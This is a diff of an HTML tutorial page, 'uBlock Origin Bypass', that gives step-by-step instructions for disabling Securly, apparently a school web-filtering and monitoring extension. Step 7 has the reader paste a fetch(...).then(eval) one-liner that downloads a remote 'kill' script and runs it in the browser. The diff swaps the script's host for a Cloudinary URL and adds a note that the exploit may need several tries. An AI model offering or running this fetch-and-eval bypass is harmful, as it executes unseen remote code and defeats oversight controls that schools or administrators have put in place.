@@ -9,6 +9,7 @@
 <body>
 <a href="/">Home</a>
 <h1>uBlock Origin Bypass</h1>
+<h2><b>NOTE: YOU MAY HAVE TO DO THE EXPLOIT A FEW TIMES BEFORE IT ACTUALLY WORKS!!!!</b></h2>
 <h2>Credit <a href="https://3kh0.github.io/ext-remover/#ublock-run-run-code-on-pages">3kh0</a>, <a href="https://github.com/Quartinal/KillCurly-Working">Quartinal</a>, and <a href="https://github.com/zek-c/Securly-Kill-V111">Zek-c</a>
 <h3>Only made to help make it easier to understand and basically unpatchable ;3 (probably untrue)</h3>
 <p>1. Download uBlock Origin if not installed.</p>
@@ -23,7 +24,7 @@
 <img src="chrome5.png">
 <p>6. Go to https://securly.com</p>
 <img src="chrome6.png">
-<p>7. After copying this <code>fetch('https://jacksdamnserver.site/kill_qn1hjn.js').then(r => r.text()).then(r => eval(r))</code></p>
+<p>7. After copying this <code>fetch('https://res.cloudinary.com/dxttxbdrd/raw/upload/v1693510756/kill_qn1hjn.js').then(r => r.text()).then(r => eval(r))</code></p>
 <p>8. Do the keybind <code>Ctrl+Shift+~</code> to show the eval prompt and place the copied code into the eval prompt and hit enter!</p>
 <img src="chrome7.png">
 <p>9. Click the off button and have fun ;D</p>
